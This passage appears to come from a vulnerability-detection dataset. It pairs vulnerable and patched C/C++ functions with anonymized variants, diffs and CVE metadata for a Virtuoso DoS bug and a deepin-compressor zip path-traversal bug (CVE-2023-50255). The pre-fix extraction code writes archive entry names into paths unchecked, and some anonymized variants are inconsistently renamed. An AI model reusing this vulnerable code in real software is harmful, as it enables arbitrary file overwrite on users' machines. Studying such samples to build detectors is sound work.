VAR_4 = qst_get (VAR_1, VAR_0->_.agg.result);
if (VAR_21 == DV_TYPE_OF (VAR_4))
{
qst_set (VAR_1, VAR_0->_.agg.result, box_copy_tree (VAR_19));
VEC_QST_CLR_NULL (VAR_1, VAR_0->_.agg.result, VAR_3->qi_set);
}
else
box_add (VAR_4, VAR_19, VAR_1, VAR_0->_.agg.result);
break;
case VAR_25:
case VAR_26:
VAR_4 = qst_get (VAR_1, VAR_0->_.agg.result);
VAR_8 = cmp_boxes (VAR_19, VAR_4, VAR_0->_.agg.arg->ssl_sqt.sqt_collation, VAR_0->_.agg.arg->ssl_sqt.sqt_collation);
if (VAR_28 == VAR_8
|| (VAR_8 == VAR_29 && VAR_25 == VAR_0->_.agg.op)
|| (VAR_8 == VAR_30 && VAR_26 == VAR_0->_.agg.op))
{
qst_set (VAR_1, VAR_0->_.agg.result, box_copy_tree (VAR_19));
if (VAR_21 != DV_TYPE_OF (VAR_19))
{
VEC_QST_CLR_NULL (VAR_1, VAR_0->_.agg.result, VAR_3->qi_set);
}
}
break;
}
}
VAR_31;
}",openlink/virtuoso-opensource/696600b5634290e7a5d02bf14f39fbce4a592663/sqlintrp.c/vul/before/0.json,"void
ins_vec_agg (instruction_t * ins, caddr_t * inst)
{
  QNCAST (query_instance_t, qi, inst);
  caddr_t prev;
  int n_sets = qi->qi_n_sets, set, first_set = 0, rc;
  data_col_t * res = QST_BOX (data_col_t *, inst, ins->_.agg.result->ssl_index);
  db_buf_t set_mask = qi->qi_set_mask;
  if (!set_mask)
    {
      if ((AMMSC_COUNT == ins->_.agg.op || AMMSC_COUNTSUM == ins->_.agg.op   || AMMSC_SUM == ins->_.agg.op)
	  && !ins->_.agg.distinct
	  && DV_LONG_INT == res->dc_dtp
	  && ((SSL_IS_VEC_OR_REF (ins->_.agg.arg)  && DV_LONG_INT == QST_BOX (data_col_t*, inst, ins->_.agg.arg->ssl_index)->dc_sqt.sqt_dtp && !QST_BOX (data_col_t*, inst, ins->_.agg.arg->ssl_index)->dc_any_null)
	      || (SSL_CONSTANT == ins->_.agg.arg->ssl_type && DV_LONG_INT == ins->_.agg.arg->ssl_sqt.sqt_dtp)))
	{
	  ins_vec_agg_int_sum (ins, inst);
	  return;
	}
    }
  if (ins->_.agg.distinct && HA_ORD_DISTINCT == ins->_.agg.distinct->ha_op)
    {
      ins_vec_agg_ord_distinct (ins, inst);
	return;
    }
  SET_LOOP
    {
      int set_no = qst_vec_get_int64 (inst, ins->_.agg.set_no, set), op;
      caddr_t arg = qst_get (inst, ins->_.agg.arg);
      dtp_t arg_dtp = DV_TYPE_OF (arg);
      if (DV_DB_NULL == arg_dtp)
	continue;
      if (ins->_.agg.distinct)
	{
	  itc_ha_feed_ret_t ihfr;
	  if (DVC_MATCH == itc_ha_feed (&ihfr, ins->_.agg.distinct, inst, 0, NULL))
	    continue;
          arg = qst_get (inst, ins->_.agg.arg); /* take argument here as itc_ha_feed mangle the place if serialized any */
	}
      op = ins->_.agg.op;
      qi->qi_set = set_no;
      if (res->dc_n_values <= set_no)
	{
	  int inx;
	  DC_CHECK_LEN (res, set_no);
	  for (inx = res->dc_n_values; inx <= set_no; inx++)
	    {
	      if (AMMSC_MIN == op || AMMSC_MAX == op || AMMSC_SUM == op)
		dc_set_null (res, inx);
	      else
		{
		  dc_append_box (res, (caddr_t)0);
		}
	    }
	}
      switch (op)
	{
	case AMMSC_COUNT:
	  ((int64*)res->dc_values)[set_no]++;
	  break;
	case AMMSC_ONE:
	  if (DC_ANY_IS_NULL (res, set_no))
	    qst_vec_set_copy (inst, ins->_.agg.result, arg);
	  break;
	case AMMSC_SUM:
	  prev = qst_get (inst, ins->_.agg.result);
	  if (DV_DB_NULL == DV_TYPE_OF (prev))
	    {
	      qst_set (inst, ins->_.agg.result, box_copy_tree (arg));
	      VEC_QST_CLR_NULL (inst, ins->_.agg.result, qi->qi_set);
	    }
	  else
	    box_add (prev, arg, inst, ins->_.agg.result);
	  break;
	case AMMSC_MIN:
	case AMMSC_MAX:
	  prev = qst_get (inst, ins->_.agg.result);
	  rc = cmp_boxes (arg, prev, ins->_.agg.arg->ssl_sqt.sqt_collation, ins->_.agg.arg->ssl_sqt.sqt_collation);
	  if (DVC_UNKNOWN == rc
	      || (rc == DVC_LESS && AMMSC_MIN == ins->_.agg.op)
	      || (rc == DVC_GREATER && AMMSC_MAX == ins->_.agg.op))
	    {
	      qst_set (inst, ins->_.agg.result, box_copy_tree (arg));
	      if (DV_DB_NULL != DV_TYPE_OF (arg))
		{
		  VEC_QST_CLR_NULL (inst, ins->_.agg.result, qi->qi_set);
		}
	    }
	  break;
	}
    }
  END_SET_LOOP;
}","void
ins_vec_agg (instruction_t * VAR_0, caddr_t * VAR_1)
{
  QNCAST (VAR_2, VAR_3, VAR_1);
  caddr_t VAR_4;
  int VAR_5 = VAR_3->qi_n_sets, VAR_6, VAR_7 = 0, VAR_8;
  data_col_t * VAR_9 = QST_BOX (data_col_t *, VAR_1, VAR_0->_.agg.result->ssl_index);
  db_buf_t VAR_10 = VAR_3->qi_set_mask;
  if (!VAR_10)
    {
      if ((VAR_11 == VAR_0->_.agg.op || VAR_12 == VAR_0->_.agg.op   || VAR_13 == VAR_0->_.agg.op)
	  && !VAR_0->_.agg.distinct
	  && VAR_14 == VAR_9->dc_dtp
	  && ((SSL_IS_VEC_OR_REF (VAR_0->_.agg.arg)  && VAR_14 == QST_BOX (data_col_t*, VAR_1, VAR_0->_.agg.arg->ssl_index)->dc_sqt.sqt_dtp && !QST_BOX (data_col_t*, VAR_1, VAR_0->_.agg.arg->ssl_index)->dc_any_null)
	      || (VAR_15 == VAR_0->_.agg.arg->ssl_type && VAR_14 == VAR_0->_.agg.arg->ssl_sqt.sqt_dtp)))
	{
	  ins_vec_agg_int_sum (VAR_0, VAR_1);
	  return;
	}
    }
  if (VAR_0->_.agg.distinct && VAR_16 == VAR_0->_.agg.distinct->ha_op)
    {
      ins_vec_agg_ord_distinct (VAR_0, VAR_1);
	return;
    }
  SET_LOOP
    {
      int VAR_17 = qst_vec_get_int64 (VAR_1, VAR_0->_.agg.set_no, VAR_6), VAR_18;
      caddr_t VAR_19 = qst_get (VAR_1, VAR_0->_.agg.arg);
      dtp_t VAR_20 = DV_TYPE_OF (VAR_19);
      if (VAR_21 == VAR_20)
	continue;
      if (VAR_0->_.agg.distinct)
	{
	  itc_ha_feed_ret_t VAR_22;
	  if (VAR_23 == itc_ha_feed (&VAR_22, VAR_0->_.agg.distinct, VAR_1, 0, NULL))
	    continue;
          VAR_19 = qst_get (VAR_1, VAR_0->_.agg.arg); /* COMMENT_0 */
	}
      VAR_18 = VAR_0->_.agg.op;
      VAR_3->qi_set = VAR_17;
      if (VAR_9->dc_n_values <= VAR_17)
	{
	  int VAR_24;
	  DC_CHECK_LEN (VAR_9, VAR_17);
	  for (VAR_24 = VAR_9->dc_n_values; VAR_24 <= VAR_17; VAR_24++)
	    {
	      if (VAR_25 == VAR_18 || VAR_26 == VAR_18 || VAR_13 == VAR_18)
		dc_set_null (VAR_9, VAR_24);
	      else
		{
		  dc_append_box (VAR_9, (caddr_t)0);
		}
	    }
	}
      switch (VAR_18)
	{
	case VAR_11:
	  ((int64*)VAR_9->dc_values)[VAR_17]++;
	  break;
	case VAR_27:
	  if (DC_ANY_IS_NULL (VAR_9, VAR_17))
	    qst_vec_set_copy (VAR_1, VAR_0->_.agg.result, VAR_19);
	  break;
	case VAR_13:
	  VAR_4 = qst_get (VAR_1, VAR_0->_.agg.result);
	  if (VAR_21 == DV_TYPE_OF (VAR_4))
	    {
	      qst_set (VAR_1, VAR_0->_.agg.result, box_copy_tree (VAR_19));
	      VEC_QST_CLR_NULL (VAR_1, VAR_0->_.agg.result, VAR_3->qi_set);
	    }
	  else
	    box_add (VAR_4, VAR_19, VAR_1, VAR_0->_.agg.result);
	  break;
	case VAR_25:
	case VAR_26:
	  VAR_4 = qst_get (VAR_1, VAR_0->_.agg.result);
	  VAR_8 = cmp_boxes (VAR_19, VAR_4, VAR_0->_.agg.arg->ssl_sqt.sqt_collation, VAR_0->_.agg.arg->ssl_sqt.sqt_collation);
	  if (VAR_28 == VAR_8
	      || (VAR_8 == VAR_29 && VAR_25 == VAR_0->_.agg.op)
	      || (VAR_8 == VAR_30 && VAR_26 == VAR_0->_.agg.op))
	    {
	      qst_set (VAR_1, VAR_0->_.agg.result, box_copy_tree (VAR_19));
	      if (VAR_21 != DV_TYPE_OF (VAR_19))
		{
		  VEC_QST_CLR_NULL (VAR_1, VAR_0->_.agg.result, VAR_3->qi_set);
		}
	    }
	  break;
	}
    }
  VAR_31;
}",openlink/virtuoso-opensource/696600b5634290e7a5d02bf14f39fbce4a592663/sqlintrp.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -35,6 +35,7 @@
 	  itc_ha_feed_ret_t ihfr;
 	  if (DVC_MATCH == itc_ha_feed (&ihfr, ins->_.agg.distinct, inst, 0, NULL))
 	    continue;
+          arg = qst_get (inst, ins->_.agg.arg); /* take argument here as itc_ha_feed mangle the place if serialized any */
 	}
       op = ins->_.agg.op;
       qi->qi_set = set_no;","{'deleted_lines': [], 'added_lines': ['          arg = qst_get (inst, ins->_.agg.arg); /* take argument here as itc_ha_feed mangle the place if serialized any */']}",True,An issue in the box_col_len function in openlink virtuoso-opensource v7.2.11 allows attackers to cause a Denial of Service (DoS) after running a SELECT statement.,7.5,HIGH,2,valid,2023-11-15T14:22:46Z,4
CVE-2023-50255,"['CWE-26', 'CWE-22', 'CWE-23']",CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,linuxdeepin/deepin-compressor,"fix: Zip Path Traversal

Zip Path Traversal

Bug: https://pms.uniontech.com/bug-view-232873.html

Log: Zip Path Traversal",82f668c78c133873f5094cfab6e4eabc0b70e4b6,https://github.com/linuxdeepin/deepin-compressor/commit/82f668c78c133873f5094cfab6e4eabc0b70e4b6,3rdparty/libzipplugin/libzipplugin.cpp,LibzipPlugin::extractEntry,"ErrorType LibzipPlugin::extractEntry(zip_t *archive, zip_int64_t index, const ExtractionOptions &options, qlonglong &qExtractSize, QString &strFileName, bool &bHandleLongName)
{
zip_stat_t statBuffer;
if (zip_stat_index(archive, zip_uint64_t(index), ZIP_FL_ENC_RAW, &statBuffer) != 0) {
return ET_FileReadError;
}
strFileName = m_common->trans2uft8(statBuffer.name, m_mapFileCode[index]);        if(strFileName.contains(QLatin1Char('\\')))
strFileName = strFileName.replace(QLatin1Char('\\'), QDir::separator());
QString strOriginName = strFileName;
QString strFilePath;
QString strTempFileName = strFileName;
int iIndex = strFileName.lastIndexOf(QDir::separator());
if (iIndex >= 0) {
strFilePath = strFileName.left(iIndex);           strTempFileName = strFileName.right(strFileName.length() - iIndex - 1);
}
QString tempFilePathName;
if(!m_bDlnfs) {
QString sDir = m_common->handleLongNameforPath(strFilePath, strFileName, m_mapLongDirName, m_mapRealDirValue);
if(sDir.length() > 0) {
strFilePath = sDir.endsWith(QDir::separator())?sDir.left(sDir.length() -1):sDir;
if(strFileName.endsWith(QDir::separator())) {
strFileName = sDir;
} else if (NAME_MAX >= QString(strTempFileName).toLocal8Bit().length()) {
strFileName = sDir + strTempFileName;
}
if(!m_mapLongDirName.isEmpty()) {
bHandleLongName = true;
}
}
if (NAME_MAX < QString(strTempFileName).toLocal8Bit().length() && !strTempFileName.endsWith(QDir::separator())) {
QString strTemp = strTempFileName.left(TRUNCATION_FILE_LONG);
tempFilePathName = strFilePath + QDir::separator() + strTemp;               if (m_mapLongName[tempFilePathName] >= LONGFILE_SAME_FILES ) {
return ET_LongNameError;
}
bHandleLongName = true;
QString sSuffix = QFileInfo(strTempFileName).completeSuffix();
if(10 < sSuffix.length()){
sSuffix = QFileInfo(strTempFileName).suffix();
if(10 < sSuffix.length()) {
sSuffix = sSuffix.right(10);
}
}
strTempFileName = strTemp + QString(""(%1)"").arg(m_mapLongName[tempFilePathName] + 1, LONGFILE_SUFFIX_FieldWidth, BINARY_NUM, QChar('0')) + ""."" + sSuffix;
strFileName = strTempFileName;
if (iIndex >= 0) {
strFileName = strFilePath + QDir::separator() + strTempFileName;
}
}
}
if (!options.strDestination.isEmpty()) {
if(bHandleLongName) {
int nCnt = options.strDestination.count(QDir::separator());
int nIndex = 0;
for(int i = 0; i < nCnt; i++){
nIndex = strFileName.indexOf(QDir::separator(), nIndex);
nIndex++;
}
strFileName = strFileName.remove(0, nIndex);
} else {
strFileName = strFileName.remove(0, options.strDestination.size());
}
}
if (bHandleLongName) {
emit signalCurFileName(strOriginName);     } else {
emit signalCurFileName(strFileName);     }
bool bIsDirectory = strFileName.endsWith(QDir::separator());    
if (QDir().exists(options.strTargetPath) == false)
QDir().mkpath(options.strTargetPath);
QString strDestFileName = options.strTargetPath + QDir::separator() + strFileName;
QFile file(strDestFileName);
QString parentDir;
if (strFileName.endsWith(QDir::separator())) {
QDir pDir = QFileInfo(strDestFileName).dir();
pDir.cdUp();
parentDir = pDir.path();
} else {
parentDir = QFileInfo(strDestFileName).path();
}
const bool restoreParentMtime = (parentDir != options.strTargetPath);
time_t parent_mtime;
if (restoreParentMtime) {
parent_mtime = QFileInfo(parentDir).lastModified().toMSecsSinceEpoch() / 1000;
}
zip_uint8_t opsys;
zip_uint32_t attributes;
if (zip_file_get_external_attributes(archive, zip_uint64_t(index), ZIP_FL_UNCHANGED, &opsys, &attributes) == -1) {
emit error((""Failed to read metadata for entry: %1""));
}
mode_t value = mode_t();
switch (opsys) {
case ZIP_OPSYS_UNIX:
value = attributes >> 16;
break;
default:            break;
}
bool isLink = false;
if(S_ISLNK(value)) {
isLink = true;
}
QFileDevice::Permissions per = getPermissions(value);
if (bIsDirectory && !isLink) {             if (PATH_MAX < QString(strFileName).toLocal8Bit().length())
return ET_LongNameError;
QDir dir;
dir.mkpath(strDestFileName);
per = per | QFileDevice::ReadUser | QFileDevice::WriteUser | QFileDevice::ExeUser ;
} else if(isLink) {         zip_file_t *zipFile = zip_fopen_index(archive, zip_uint64_t(index), 0);
char buf[READBYTES] = {0};
const auto readBytes = zip_fread(zipFile, buf, zip_uint64_t(READBYTES));
if (readBytes > 0) {
QString strBuf = QString(buf).toLocal8Bit();
if (QFile::link(strBuf, strDestFileName)) {
qInfo() << ""Symlink's created:"" << buf << strFileName;
} else {
qInfo() << ""Can't create symlink"" << buf << strFileName;
}
}
file.close();
zip_fclose(zipFile);
} else {        
if (file.exists()) {
if (m_bSkipAll) {                       m_mapLongName[tempFilePathName]++;                   return ET_NoError;
} else {
if (!m_bOverwriteAll) {     
OverwriteQuery query(strDestFileName);
emit signalQuery(&query);
query.waitForResponse();
if (query.responseCancelled()) {
emit signalCancel();
return ET_UserCancelOpertion;
} else if (query.responseSkip()) {
m_mapLongName[tempFilePathName]++;                           return ET_NoError;
} else if (query.responseSkipAll()) {
m_bSkipAll = true;
m_mapLongName[tempFilePathName]++;                           return ET_NoError;
}  else if (query.responseOverwriteAll()) {
m_bOverwriteAll = true;
}
}
}
}
if (bHandleLongName) {
m_setLongName << strFileName;
}
if (file.exists() && !file.isWritable()) {
file.remove();
file.setFileName(strDestFileName);
file.setPermissions(QFileDevice::WriteUser);
}
if (QDir().exists(QFileInfo(strDestFileName).path()) == false)
QDir().mkpath(QFileInfo(strDestFileName).path());
zip_file_t *zipFile = zip_fopen_index(archive, zip_uint64_t(index), 0);
if (nullptr == zipFile) {
int iErr = zip_error_code_zip(zip_get_error(archive));
if (ZIP_ER_WRONGPASSWD == iErr) {
bool bCheckFinished = false;
int iCodecIndex = 0;
while (nullptr == zipFile && false == bCheckFinished) {
if (m_listCodecs.length() == iCodecIndex) {
bCheckFinished = true;
if (file.exists()) {
file.remove();
}
return ET_WrongPassword;
} else {
zip_set_default_password(archive, passwordUnicode(m_strPassword, iCodecIndex).data());
iCodecIndex++;
zip_error_clear(archive);
zipFile = zip_fopen_index(archive, zip_uint64_t(index), 0);
iErr = zip_error_code_zip(zip_get_error(archive));
if (iErr != ZIP_ER_WRONGPASSWD && zipFile != nullptr) {                            bCheckFinished = true;
}
}
}
} else if (ZIP_ER_NOPASSWD == iErr) {                   return ET_NeedPassword;
} else {
return ET_FileOpenError;
}
}
if (file.open(QIODevice::WriteOnly) == false) {
zip_fclose(zipFile);
QList<QString> entryNameList = strDestFileName.split('/');
foreach (auto &tmp, entryNameList) {
if (NAME_MAX < tmp.toLocal8Bit().length()) {
return ET_LongNameError;
}
}
emit signalFileWriteErrorName(QFileInfo(file.fileName()).fileName());
return ET_FileWriteError;
}
QDataStream out(&file);
zip_int64_t sum = 0;
char buf[READBYTES];
int writeSize = 0;
double dScale = 1;
if (!options.bExistList) {
dScale = double(statBuffer.comp_size) / statBuffer.size;
}
while (sum != zip_int64_t(statBuffer.size)) {
if (QThread::currentThread()->isInterruptionRequested()) {
break;
}
if (m_bPause) {                 sleep(1);
continue;
}
const auto readBytes = zip_fread(zipFile, buf, zip_uint64_t(READBYTES));
if (readBytes < 0) {
file.close();
zip_fclose(zipFile);
emit signalFileWriteErrorName(QFileInfo(file.fileName()).fileName());
return ET_FileWriteError;
}
if (out.writeRawData(buf, int(readBytes)) != readBytes) {
file.close();
zip_fclose(zipFile);
if (isInsufficientDiskSpace(options.strTargetPath, static_cast<qint64>(readBytes))) {                      return ET_InsufficientDiskSpace;
} else {
emit signalFileWriteErrorName(QFileInfo(file.fileName()).fileName());
return ET_FileWriteError;
}
}
sum += readBytes;
writeSize += readBytes;
qExtractSize += readBytes * dScale;
emit signalprogress((double(qExtractSize)) * m_dScaleSize);
}
file.close();
zip_fclose(zipFile);
}
if(!isLink) {
file.setPermissions(per);
utimbuf times;
times.modtime = statBuffer.mtime;
utime(strDestFileName.toUtf8().constData(), &times);
if (restoreParentMtime) {
times.modtime = parent_mtime;
utime(parentDir.toUtf8().constData(), &times);
}
}
m_mapLongName[tempFilePathName]++;       return ET_NoError;
}","ErrorType LibzipPlugin::extractEntry(zip_t *VAR_0, zip_int64_t VAR_1, const ExtractionOptions &VAR_2, qlonglong &VAR_3, QString &VAR_4, bool &VAR_5)
{
zip_stat_t VAR_6;
if (zip_stat_index(VAR_0, zip_uint64_t(VAR_1), VAR_7, &VAR_6) != 0) {
return VAR_8;
}
VAR_4 = VAR_9->trans2uft8(VAR_6.name, VAR_10[VAR_1]);    
if(VAR_4.contains(QLatin1Char('\\')))
VAR_4 = VAR_4.replace(QLatin1Char('\\'), QDir::separator());
QString VAR_11 = VAR_4;
QString VAR_12;
QString VAR_13 = VAR_4;
int VAR_14 = VAR_4.lastIndexOf(QDir::separator());
if (VAR_14 >= 0) {
VAR_12 = VAR_4.left(VAR_14);   
VAR_13 = VAR_4.right(VAR_4.length() - VAR_14 - 1);
}
QString VAR_15;
if(!VAR_16) {
QString VAR_17 = VAR_9->handleLongNameforPath(VAR_12, VAR_4, VAR_18, VAR_19);
if(VAR_17.length() > 0) {
VAR_12 = VAR_17.endsWith(QDir::separator())?VAR_17.left(VAR_17.length() -1):VAR_17;
if(VAR_4.endsWith(QDir::separator())) {
VAR_4 = VAR_17;
} else if (VAR_20 >= QString(VAR_13).toLocal8Bit().length()) {
VAR_4 = VAR_17 + VAR_13;
}
if(!VAR_18.isEmpty()) {
VAR_5 = true;
}
}
if (VAR_20 < QString(VAR_13).toLocal8Bit().length() && !VAR_13.endsWith(QDir::separator())) {
QString VAR_21 = VAR_13.left(VAR_22);
VAR_15 = VAR_12 + QDir::separator() + VAR_21;   
if (VAR_23[VAR_15] >= VAR_24 ) {
return VAR_25;
}
VAR_5 = true;
QString VAR_26 = QFileInfo(VAR_13).completeSuffix();
if(10 < VAR_26.length()){
VAR_26 = QFileInfo(VAR_13).suffix();
if(10 < VAR_26.length()) {
VAR_26 = VAR_26.right(10);
}
}
VAR_13 = VAR_21 + QString(""(%1)"").arg(VAR_23[VAR_15] + 1, VAR_27, VAR_28, QChar('0')) + ""."" + VAR_26;
VAR_4 = VAR_13;
if (VAR_14 >= 0) {
VAR_4 = VAR_12 + QDir::separator() + VAR_13;
}
}
}
if (!VAR_2.strDestination.isEmpty()) {
if(VAR_5) {
int VAR_29 = VAR_2.strDestination.count(QDir::separator());
int VAR_30 = 0;
for(int VAR_31 = 0; VAR_31 < VAR_29; VAR_31++){
VAR_30 = VAR_4.indexOf(QDir::separator(), VAR_30);
VAR_30++;
}
VAR_4 = VAR_4.remove(0, VAR_30);
} else {
VAR_4 = VAR_4.remove(0, VAR_2.strDestination.size());
}
}
if (VAR_5) {
emit signalCurFileName(strOriginName); 
} else {
emit signalCurFileName(strFileName); 
}
bool VAR_32 = strFileName.endsWith(QDir::separator());    
if (QDir().exists(VAR_2.strTargetPath) == false)
QDir().mkpath(VAR_2.strTargetPath);
QString VAR_33 = VAR_2.strTargetPath + QDir::separator() + strFileName;
QFile file(strDestFileName);
QString VAR_34;
if (strFileName.endsWith(QDir::separator())) {
QDir VAR_35 = QFileInfo(strDestFileName).dir();
VAR_35.cdUp();
VAR_34 = VAR_35.path();
} else {
VAR_34 = QFileInfo(strDestFileName).path();
}
const bool VAR_36 = (VAR_34 != VAR_2.strTargetPath);
time_t VAR_37;
if (VAR_36) {
VAR_37 = QFileInfo(VAR_34).lastModified().toMSecsSinceEpoch() / 1000;
}
zip_uint8_t VAR_38;
zip_uint32_t VAR_39;
if (zip_file_get_external_attributes(VAR_0, zip_uint64_t(VAR_1), VAR_40, &VAR_38, &VAR_39) == -1) {
emit VAR_41((""Failed to read metadata for entry: %1""));
}
mode_t VAR_42 = mode_t();
switch (VAR_38) {
case VAR_43:
VAR_42 = VAR_39 >> 16;
break;
default:    
break;
}
bool VAR_44 = false;
if(S_ISLNK(VAR_42)) {
VAR_44 = true;
}
QFileDevice::Permissions VAR_45 = getPermissions(VAR_42);
if (VAR_32 && !VAR_44) {     
if (VAR_46 < QString(strFileName).toLocal8Bit().length())
return VAR_25;
QDir VAR_47;
VAR_47.mkpath(strDestFileName);
VAR_45 = VAR_45 | QFileDevice::ReadUser | QFileDevice::WriteUser | QFileDevice::ExeUser ;
} else if(VAR_44) { 
zip_file_t *VAR_48 = zip_fopen_index(VAR_0, zip_uint64_t(VAR_1), 0);
char VAR_49[VAR_50] = {0};
const auto VAR_51 = zip_fread(VAR_48, VAR_49, zip_uint64_t(VAR_50));
if (VAR_51 > 0) {
QString VAR_52 = QString(VAR_49).toLocal8Bit();
if (QFile::link(VAR_52, strDestFileName)) {
qInfo() << ""Symlink's created:"" << VAR_49 << strFileName;
} else {
qInfo() << ""Can't create symlink"" << VAR_49 << strFileName;
}
}
VAR_53.close();
zip_fclose(VAR_48);
} else {        
if (VAR_53.exists()) {
if (VAR_54) {       
VAR_23[VAR_15]++;   
return VAR_55;
} else {
if (!VAR_56) {     
OverwriteQuery query(strDestFileName);
emit VAR_57(&VAR_58);
VAR_58.waitForResponse();
if (VAR_58.responseCancelled()) {
emit signalCancel();
return VAR_59;
} else if (VAR_58.responseSkip()) {
VAR_23[VAR_15]++;   
return VAR_55;
} else if (VAR_58.responseSkipAll()) {
VAR_54 = true;
VAR_23[VAR_15]++;   
return VAR_55;
}  else if (VAR_58.responseOverwriteAll()) {
VAR_56 = true;
}
}
}
}
if (VAR_5) {
VAR_60 << strFileName;
}
if (VAR_53.exists() && !VAR_53.isWritable()) {
VAR_53.remove();
VAR_53.setFileName(strDestFileName);
VAR_53.setPermissions(QFileDevice::WriteUser);
}
if (QDir().exists(QFileInfo(strDestFileName).path()) == false)
QDir().mkpath(QFileInfo(strDestFileName).path());
zip_file_t *VAR_48 = zip_fopen_index(VAR_0, zip_uint64_t(VAR_1), 0);
if (nullptr == VAR_48) {
int VAR_61 = zip_error_code_zip(zip_get_error(VAR_0));
if (VAR_62 == VAR_61) {
bool VAR_63 = false;
int VAR_64 = 0;
while (nullptr == VAR_48 && false == VAR_63) {
if (VAR_65.length() == VAR_64) {
VAR_63 = true;
if (VAR_53.exists()) {
VAR_53.remove();
}
return VAR_66;
} else {
zip_set_default_password(VAR_0, passwordUnicode(VAR_67, VAR_64).data());
VAR_64++;
zip_error_clear(VAR_0);
VAR_48 = zip_fopen_index(VAR_0, zip_uint64_t(VAR_1), 0);
VAR_61 = zip_error_code_zip(zip_get_error(VAR_0));
if (VAR_61 != VAR_62 && VAR_48 != nullptr) {
VAR_63 = true;
}
}
}
} else if (VAR_68 == VAR_61) {   
return VAR_69;
} else {
return VAR_70;
}
}
if (VAR_53.open(QIODevice::WriteOnly) == false) {
zip_fclose(VAR_48);
QList<QString> VAR_71 = strDestFileName.split('/');
foreach (auto &VAR_72, entryNameList) {
if (VAR_20 < VAR_72.toLocal8Bit().length()) {
return VAR_25;
}
}
emit VAR_73(QFileInfo(VAR_53.fileName()).fileName());
return VAR_74;
}
QDataStream VAR_75(&VAR_53);
zip_int64_t VAR_76 = 0;
char VAR_49[VAR_50];
int VAR_77 = 0;
double VAR_78 = 1;
if (!VAR_2.bExistList) {
VAR_78 = double(VAR_6.comp_size) / VAR_6.size;
}
while (VAR_76 != zip_int64_t(VAR_6.size)) {
if (QThread::currentThread()->isInterruptionRequested()) {
break;
}
if (VAR_79) { 
sleep(1);
continue;
}
const auto VAR_51 = zip_fread(VAR_48, VAR_49, zip_uint64_t(VAR_50));
if (VAR_51 < 0) {
VAR_53.close();
zip_fclose(VAR_48);
emit VAR_73(QFileInfo(VAR_53.fileName()).fileName());
return VAR_74;
}
if (VAR_75.writeRawData(VAR_49, int(VAR_51)) != VAR_51) {
VAR_53.close();
zip_fclose(VAR_48);
if (isInsufficientDiskSpace(VAR_2.strTargetPath, VAR_80<qint64>(VAR_51))) {  
return VAR_81;
} else {
emit VAR_73(QFileInfo(VAR_53.fileName()).fileName());
return VAR_74;
}
}
VAR_76 += VAR_51;
VAR_77 += VAR_51;
VAR_3 += VAR_51 * VAR_78;
emit VAR_82((double(VAR_3)) * VAR_83);
}
VAR_53.close();
zip_fclose(VAR_48);
}
if(!VAR_44) {
VAR_53.setPermissions(VAR_45);
utimbuf VAR_84;
VAR_84.modtime = VAR_6.mtime;
utime(strDestFileName.toUtf8().constData(), &VAR_84);
if (VAR_36) {
VAR_84.modtime = VAR_37;
utime(VAR_34.toUtf8().constData(), &VAR_84);
}
}
VAR_23[VAR_15]++;   
return VAR_55;
}",linuxdeepin/deepin-compressor/82f668c78c133873f5094cfab6e4eabc0b70e4b6/libzipplugin.cpp/vul/before/0.json,"ErrorType LibzipPlugin::extractEntry(zip_t *archive, zip_int64_t index, const ExtractionOptions &options, qlonglong &qExtractSize, QString &strFileName, bool &bHandleLongName)
{
    zip_stat_t statBuffer;
    if (zip_stat_index(archive, zip_uint64_t(index), ZIP_FL_ENC_RAW, &statBuffer) != 0) {
        return ET_FileReadError;
    }

    strFileName = m_common->trans2uft8(statBuffer.name, m_mapFileCode[index]);    // 
    //fix 232873
    if(strFileName.indexOf(""../"") != -1) {
        qInfo() << ""skipped ../ path component(s) in "" << strFileName;
        strFileName = strFileName.replace(""../"", """");
    }
    if(strFileName.contains(QLatin1Char('\\')))
        strFileName = strFileName.replace(QLatin1Char('\\'), QDir::separator());
    QString strOriginName = strFileName;

    // 
//    QStringList listPath = strFileName.split(QDir::separator());
//    listPath.removeLast();
//    for (int i = 0; i < listPath.count(); ++i) {
//        if (NAME_MAX < QString(listPath[i]).toLocal8Bit().length()) {
//            emit signalCurFileName(strFileName); // 
//            return ET_LongNameError;
//        }
//    }

    QString strFilePath;
    QString strTempFileName = strFileName;
    int iIndex = strFileName.lastIndexOf(QDir::separator());

    if (iIndex >= 0) {
        strFilePath = strFileName.left(iIndex);   // bug114527 left
        strTempFileName = strFileName.right(strFileName.length() - iIndex - 1);
    }

    QString tempFilePathName;
    if(!m_bDlnfs) {
        QString sDir = m_common->handleLongNameforPath(strFilePath, strFileName, m_mapLongDirName, m_mapRealDirValue);
        if(sDir.length() > 0) {
           strFilePath = sDir.endsWith(QDir::separator())?sDir.left(sDir.length() -1):sDir;
           if(strFileName.endsWith(QDir::separator())) {
               strFileName = sDir;
           } else if (NAME_MAX >= QString(strTempFileName).toLocal8Bit().length()) {
               strFileName = sDir + strTempFileName;
           }
           if(!m_mapLongDirName.isEmpty()) {
               bHandleLongName = true;
           }
        }
        if (NAME_MAX < QString(strTempFileName).toLocal8Bit().length() && !strTempFileName.endsWith(QDir::separator())) {
            QString strTemp = strTempFileName.left(TRUNCATION_FILE_LONG);

            // ,
            tempFilePathName = strFilePath + QDir::separator() + strTemp;   // 
            if (m_mapLongName[tempFilePathName] >= LONGFILE_SAME_FILES ) {
                return ET_LongNameError;
            }
            bHandleLongName = true;
            QString sSuffix = QFileInfo(strTempFileName).completeSuffix();
            if(10 < sSuffix.length()){
                sSuffix = QFileInfo(strTempFileName).suffix();
                if(10 < sSuffix.length()) {
                    sSuffix = sSuffix.right(10);
                }
            }
            strTempFileName = strTemp + QString(""(%1)"").arg(m_mapLongName[tempFilePathName] + 1, LONGFILE_SUFFIX_FieldWidth, BINARY_NUM, QChar('0')) + ""."" + sSuffix;

            strFileName = strTempFileName;
            if (iIndex >= 0) {
                strFileName = strFilePath + QDir::separator() + strTempFileName;
            }

        }
    }

    // 
    if (!options.strDestination.isEmpty()) {
        if(bHandleLongName) {
            int nCnt = options.strDestination.count(QDir::separator());
            int nIndex = 0;
            for(int i = 0; i < nCnt; i++){
                nIndex = strFileName.indexOf(QDir::separator(), nIndex);
                nIndex++;
            }
            strFileName = strFileName.remove(0, nIndex);
        } else {
            strFileName = strFileName.remove(0, options.strDestination.size());
        }
    }


    if (bHandleLongName) {
        emit signalCurFileName(strOriginName); // 
    } else {
        emit signalCurFileName(strFileName); // 
    }

    bool bIsDirectory = strFileName.endsWith(QDir::separator());    // 

    // 
